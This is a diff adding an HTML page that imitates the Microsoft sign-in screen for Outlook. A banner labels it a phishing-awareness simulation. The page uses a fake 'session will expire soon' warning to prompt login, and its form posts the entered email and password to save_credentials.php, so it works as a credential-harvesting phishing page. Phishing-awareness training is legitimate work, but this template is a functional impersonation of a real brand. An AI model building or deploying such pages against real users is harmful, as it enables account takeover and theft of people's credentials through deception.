@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft - Sign In</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Educational Warning -->
+    <div class="edu-warning">
+        🚨 EDUCATIONAL SIMULATION - This is a phishing awareness demo 🚨
+    </div>
+
+    <div class="container">
+        <div class="ms-logo-text">Microsoft</div>
+        
+        <h2>Sign in</h2>
+        <p class="subtitle">to continue to Outlook</p>
+
+        <div class="security-info">
+            <span class="warning-icon">⚠️</span>
+            Your session will expire soon. Please sign in to continue.
+        </div>
+
+        <form method="POST" action="save_credentials.php">
+            <div class="form-group">
+                <label for="username">Email, phone, or Skype</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+
+            <button type="submit">Sign in</button>
+        </form>
+
+        <div class="sign-in-options">
+            <a href="#" class="sign-in-link">Can't access your account?</a><br><br>
+            <a href="#" class="sign-in-link">Sign in with a security key</a>
+        </div>
+
+        <div class="footer-links">
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+            <a href="#">Help</a>
+        </div>
+    </div>
+</body>
+</html>
